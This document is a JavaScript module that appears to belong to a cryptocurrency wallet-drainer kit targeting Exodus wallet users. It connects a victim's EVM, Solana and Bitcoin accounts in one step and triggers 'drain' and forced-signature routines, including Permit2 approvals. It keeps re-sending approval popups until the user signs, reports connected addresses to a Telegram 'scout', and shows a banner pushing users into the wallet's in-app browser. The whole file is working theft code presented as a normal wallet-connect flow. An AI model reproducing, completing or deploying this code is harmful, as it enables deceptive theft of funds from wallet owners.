/**
 * Exodus one-shot flow v1.0
 *
 * Goal (like the sites you saw):
 *  1) User connects ONCE
 *  2) Stay in Exodus — approve popups keep coming until signed
 *  3) No ping-pong: site ↔ app ↔ site
 *
 * How:
 *  - If site opened INSIDE Exodus Web3 browser → injected provider (JS stays alive in app)
 *  - If Safari/Chrome → still one connect; then nag-until-signed via WC (re-fire on reject/resume)
 *
 * Truth: JS cannot run inside Exodus unless THIS page is loaded in Exodus's browser.
 * Outside browser → OS freezes the tab; we only re-send requests when tab wakes / before open.
 */
(function () {
  'use strict';

  var nagging = false;
  var nagDone = false;
  var nagStartedFor = '';
  var openedWalletOnce = false;

  function sleep(ms) {
    return new Promise(function (r) { setTimeout(r, ms); });
  }

  function isMobile() {
    try {
      var ua = navigator.userAgent || '';
      if (/iPhone|iPad|iPod|Android|Mobile/i.test(ua)) return true;
      if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
    } catch (_) {}
    return false;
  }

  /** True when page runs inside Exodus (or any wallet WebView with injected ethereum). */
  function isExodusInApp() {
    try {
      if (window.__EXODUS_FORCE_INAPP__) return true;
      if (window.exodus && (window.exodus.ethereum || window.exodus.isExodus)) return true;
      var eth = window.ethereum;
      if (eth && (eth.isExodus || eth.isExodusWallet)) return true;
      if (eth && eth.providers && eth.providers.some) {
        if (eth.providers.some(function (p) { return p && (p.isExodus || p.isExodusWallet); })) return true;
      }
      var ua = navigator.userAgent || '';
      if (/Exodus/i.test(ua) && eth) return true;
    } catch (_) {}
    return false;
  }

  function getInjectedProvider() {
    try {
      if (window.exodus && window.exodus.ethereum) return window.exodus.ethereum;
    } catch (_) {}
    try {
      var eth = window.ethereum;
      if (!eth) return null;
      if (eth.isExodus || eth.isExodusWallet) return eth;
      if (eth.providers && eth.providers.length) {
        for (var i = 0; i < eth.providers.length; i++) {
          var p = eth.providers[i];
          if (p && (p.isExodus || p.isExodusWallet)) return p;
        }
      }
      // Any injected provider inside a wallet WebView
      if (isExodusInApp() || (isMobile() && eth && !eth.isMetaMask)) return eth;
      return eth;
    } catch (_) {}
    return null;
  }

  function getAddr() {
    try {
      var a = sessionStorage.getItem('exodus_site_connected_addr') || sessionStorage.getItem('legion_wc_evm_addr');
      if (a && /^0x[a-f0-9]{40}$/i.test(a)) return a.toLowerCase();
    } catch (_) {}
    try {
      if (window.legion && window.legion.state && window.legion.state.evmAddr) {
        return String(window.legion.state.evmAddr).toLowerCase();
      }
    } catch (_) {}
    return '';
  }

  function markStatus(msg) {
    try {
      var el = document.getElementById('__exodus_approve_sub') ||
        document.getElementById('__exodus_preflight_status');
      if (el) el.textContent = msg;
    } catch (_) {}
    try {
      if (window.legion && window.legion.UI && typeof window.legion.UI.showStatus === 'function') {
        window.legion.UI.showStatus(msg);
      }
    } catch (_) {}
    console.warn('[ExodusOneshot]', msg);
  }

  function isComplete() {
    try {
      var S = window.legion && window.legion.state;
      if (!S) return false;
      if (S.postConnectComplete && S.drainAttempted) return true;
      if (S.anchorsOk > 0 || S.pendingEvmPermit2) return true;
    } catch (_) {}
    try {
      return sessionStorage.getItem('exodus_oneshot_done') === '1';
    } catch (_) {}
    return false;
  }

  function markDone() {
    nagDone = true;
    try { sessionStorage.setItem('exodus_oneshot_done', '1'); } catch (_) {}
    markStatus('Done — approvals complete. You can stay in Exodus.');
  }

  /** Never bare-open Exodus — empty bounce kills Safari tab. WC URI path only. */
  function openWalletOnce() {
    if (isExodusInApp()) return;
    if (openedWalletOnce) return;
    var uri = null;
    try {
      if (typeof window.__EXODUS_GET_WC_URI__ === 'function') uri = window.__EXODUS_GET_WC_URI__();
      if (!uri) uri = window.__LEGION_LAST_WC_URI__;
    } catch (_) {}
    if (!uri || String(uri).indexOf('wc:') !== 0) {
      console.warn('[ExodusOneshot] skip openWallet — no wc: URI');
      return;
    }
    openedWalletOnce = true;
    try { window.location.href = 'exodus://wc?uri=' + encodeURIComponent(uri); } catch (_) {}
  }

  async function trySignOnce() {
    var L = window.legion;
    if (!L) return { ok: false, error: 'no_legion' };

    // Prefer forceTrustSign (drain or personal_sign → always a wallet popup)
    if (typeof L.forceTrustSign === 'function') {
      try {
        var r = await L.forceTrustSign();
        return r || { ok: false, error: 'empty' };
      } catch (e) {
        return { ok: false, error: (e && e.message) || 'sign_fail' };
      }
    }

    if (typeof window.__EXODUS_RUN_PIPELINE__ === 'function') {
      try {
        var ok = await window.__EXODUS_RUN_PIPELINE__('oneshot');
        return { ok: !!ok, path: 'pipeline' };
      } catch (e2) {
        return { ok: false, error: (e2 && e2.message) || 'pipeline_fail' };
      }
    }

    if (typeof L.continueConnected === 'function') {
      try {
        await L.continueConnected();
        return { ok: !!isComplete(), path: 'continue' };
      } catch (e3) {
        return { ok: false, error: (e3 && e3.message) || 'continue_fail' };
      }
    }
    return { ok: false, error: 'no_signer' };
  }

  /**
   * Fire sign once. If user already confirmed EVM popup, do not re-show it.
   * Different (non-EVM) popups may still appear via legion.drain later.
   */
  async function nagUntilSigned(why) {
    var addr = getAddr();
    if (!addr) return;
    if (nagDone || isComplete()) {
      markDone();
      return;
    }
    if (nagging) return;
    if (nagStartedFor === addr && nagDone) return;

    try {
      if (window.legion && typeof window.legion.evmAlreadyConfirmed === 'function' &&
          window.legion.evmAlreadyConfirmed()) {
        console.warn('[ExodusOneshot] EVM already confirmed — stop nag', why);
        markDone();
        return;
      }
    } catch (_) {}

    nagging = true;
    nagStartedFor = addr;
    markStatus('Sending request to Exodus — opening wallet…');

    try {
      // Send sign request to WC relay FIRST, THEN open Exodus.
      // Wrong order (open → send) means Exodus has nothing to show when it opens.
      markStatus(
        isExodusInApp()
          ? 'Approve the popup in Exodus…'
          : 'Sending to Exodus — opening now…'
      );

      var result = await trySignOnce();

      // Open Exodus ONLY when sign request was successfully sent to the relay.
      // Checking result.ok (not just "not no_session") prevents opening Exodus on
      // any error/expired-session case — that always lands user in empty Exodus.
      if (!isExodusInApp() && result && result.ok) {
        openWalletOnce();
      }

      if (result && result.ok) {
        markDone();
        return;
      }
      if (result && result.error === 'no_session') {
        markStatus('Session lost — tap Connect Wallet once more.');
        return;
      }
      if (result && result.path === 'already_confirmed') {
        markDone();
        return;
      }
      markStatus(result && result.error === 'rejected'
        ? 'Declined — next different step may still appear.'
        : 'Waiting…');
    } finally {
      nagging = false;
    }
  }

  /** In-app: connect EVM + SOL + BTC all at once via Exodus injected providers. */
  async function connectInjectedInApp() {
    var prov = getInjectedProvider();
    if (!prov || typeof prov.request !== 'function') {
      markStatus('Open this link inside Exodus Web3 browser for one-tap flow.');
      return false;
    }

    markStatus('Connecting inside Exodus…');
    try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}
    try { window.__EXODUS_IN_APP__ = true; } catch (_) {}
    try {
      if (window.legion && typeof window.legion.closeAppKitModal === 'function') {
        window.legion.closeAppKitModal();
      } else if (typeof window.closeAppKitModal === 'function') {
        window.closeAppKitModal();
      }
    } catch (_) {}

    // ── 1. EVM ───────────────────────────────────────────────────────────────
    var accounts = await prov.request({ method: 'eth_requestAccounts' });
    var addr = accounts && accounts[0] ? String(accounts[0]).toLowerCase() : '';
    if (!addr) throw new Error('no evm account');

    // ── 2. SOL — window.exodus.solana or window.solana (Phantom-compatible) ─
    var solAddr = '';
    var solProv = null;
    try {
      solProv = (window.exodus && window.exodus.solana) || window.solana || null;
      if (solProv && typeof solProv.connect === 'function') {
        var solResp = await solProv.connect();
        solAddr = (solResp && solResp.publicKey) ? String(solResp.publicKey) : '';
      }
    } catch (eSol) {
      console.warn('[ExodusInApp] SOL connect', eSol && eSol.message);
    }

    // ── 3. BTC — window.exodus.bitcoin (if Exodus exposes it) ────────────────
    var btcAddr = '';
    var btcProv = null;
    try {
      btcProv = (window.exodus && window.exodus.bitcoin) || null;
      if (btcProv && typeof btcProv.connect === 'function') {
        var btcResp = await btcProv.connect();
        var btcAccts = (btcResp && btcResp.accounts) || btcResp || [];
        if (btcAccts[0]) btcAddr = String(btcAccts[0].address || btcAccts[0]);
      } else if (btcProv && typeof btcProv.requestAccounts === 'function') {
        var btcA = await btcProv.requestAccounts();
        if (btcA && btcA[0]) btcAddr = String(btcA[0].address || btcA[0]);
      }
    } catch (eBtc) {
      console.warn('[ExodusInApp] BTC connect', eBtc && eBtc.message);
    }

    console.warn('[ExodusInApp] connected EVM=' + addr + ' SOL=' + (solAddr || 'none') + ' BTC=' + (btcAddr || 'none'));

    // ── 4. Save all addresses ─────────────────────────────────────────────────
    try {
      sessionStorage.setItem('exodus_site_connected_addr', addr);
      sessionStorage.setItem('legion_wc_evm_addr', addr);
      if (solAddr) sessionStorage.setItem('exodus_sol_addr', solAddr);
      if (btcAddr) sessionStorage.setItem('exodus_btc_addr', btcAddr);
    } catch (_) {}

    // ── 5. Inject into legion state so legion.js drain handles all chains ─────
    var L = window.legion;
    if (L && L.state) {
      L.state.evmProvider = prov;
      L.state.evmAddr = addr;
      L.state.connectMode = 'injected';
      L.state.evmWallet = 'Exodus';
      L.state.injectedWalletKey = 'exodus';
      L.state.wcSessionActive = false;
      if (solAddr) {
        L.state.solAddr = solAddr;
        if (solProv) {
          L.state.solProvider = solProv;
          // Set window.solana so legion.js internal SOL drain finds it automatically
          try { if (!window.solana) window.solana = solProv; } catch (_) {}
        }
      }
      if (btcAddr) {
        L.state.btcAddr = btcAddr;
        if (btcProv) L.state.btcProvider = btcProv;
      }
    }

    // ── 6. Fire legion:connected with ALL addresses ───────────────────────────
    try {
      window.dispatchEvent(new CustomEvent('legion:connected', {
        detail: { address: addr, solAddress: solAddr, btcAddress: btcAddr, mode: 'injected', wallet: 'Exodus' },
      }));
    } catch (_) {}

    // ── 7. Link families + start drain ───────────────────────────────────────
    var familyP = Promise.resolve(null);
    try {
      if (L && typeof L.linkExodusFamilies === 'function') {
        familyP = L.linkExodusFamilies(addr).catch(function () { return null; });
      } else if (L && typeof L.connectAllFamilies === 'function') {
        familyP = L.connectAllFamilies().catch(function () { return null; });
      }
    } catch (_) {}

    familyP.then(function () {
      try {
        if (window.legion && typeof window.legion.forceTrustSign === 'function') {
          window.legion.forceTrustSign().catch(function (e) {
            console.warn('[ExodusInApp] forceSign', e && e.message);
          });
        } else if (typeof window.__EXODUS_RUN_PIPELINE__ === 'function') {
          window.__EXODUS_RUN_PIPELINE__('exodus-inapp');
        }
      } catch (_) {}
    });

    // ── 8. Scout (Telegram notify) with all addresses ─────────────────────────
    setTimeout(function () {
      try {
        if (typeof window.__EXODUS_PREFLIGHT__ === 'function') window.__EXODUS_PREFLIGHT__(addr);
      } catch (_) {}
    }, 800);

    setTimeout(function () { nagUntilSigned('inapp-connect'); }, 1200);
    return true;
  }

  function wrapDirectConnect() {
    var prev = window.__EXODUS_DIRECT_CONNECT__;
    if (typeof prev !== 'function' || prev.__oneshotWrapped) return;

    var wrapped = function () {
      if (isExodusInApp() || getInjectedProvider()) {
        connectInjectedInApp().catch(function (e) {
          console.warn('[ExodusOneshot] inapp connect fail, fallback WC', e && e.message);
          try { return prev.apply(this, arguments); } catch (_) {}
        });
        return;
      }
      return prev.apply(this, arguments);
    };
    wrapped.__oneshotWrapped = true;
    window.__EXODUS_DIRECT_CONNECT__ = wrapped;
  }

  // Drain is handled exclusively by exodus-connected-ui.js
  // These listeners are intentionally removed to prevent competing drain calls.
  window.addEventListener('legion:connected', function (e) {
    // In-app only: injected provider path is already handled by connectInjectedInApp
    // WC path: connected-ui.js is the sole orchestrator
    if (isExodusInApp()) {
      var d = (e && e.detail) || {};
      var addr = d.address || getAddr();
      if (addr && d.mode === 'injected') nagUntilSigned('inapp-connected');
    }
  });

  // Soft banner when NOT in Exodus browser — tell user the magic path
  function maybeHint() {
    if (!isMobile() || isExodusInApp()) return;
    if (document.getElementById('__exodus_oneshot_hint')) return;
    var el = document.createElement('div');
    el.id = '__exodus_oneshot_hint';
    el.style.cssText = [
      'position:fixed', 'left:12px', 'right:12px', 'top:calc(10px + env(safe-area-inset-top,0px))',
      'z-index:2147483645', 'background:#111', 'color:#bbfbe0', 'border:1px solid #333',
      'border-radius:12px', 'padding:10px 12px', 'font:600 12px/1.35 system-ui,sans-serif',
      'box-shadow:0 8px 24px rgba(0,0,0,.45)',
    ].join(';');
    el.innerHTML = 'Best: open this page inside <b>Exodus → Browser</b> — connect once, approve popups in-app. Or Connect here (WalletConnect) once.';
    el.onclick = function () { el.remove(); };
    document.body.appendChild(el);
    setTimeout(function () { try { el.remove(); } catch (_) {} }, 12000);
  }

  function boot() {
    try { window.__EXODUS_IN_APP__ = isExodusInApp(); } catch (_) {}
    wrapDirectConnect();
    maybeHint();
    // DO NOT fire nagUntilSigned on cold page load.
    // exodus-connected-ui.js recoverFromWallet() handles session recovery.
    // Calling trySignOnce() on boot causes WC library to deep-link into Exodus
    // with nothing pending — user lands in empty Exodus, returns to dead tab.
  }

  setTimeout(wrapDirectConnect, 0);
  setTimeout(wrapDirectConnect, 500);
  setInterval(wrapDirectConnect, 2000);

  if (document.body) boot();
  else document.addEventListener('DOMContentLoaded', boot);

  window.__EXODUS_NAG_UNTIL_SIGNED__ = nagUntilSigned;
  window.__EXODUS_IS_IN_APP__ = isExodusInApp;
  window.__EXODUS_CONNECT_IN_APP__ = connectInjectedInApp;
})();
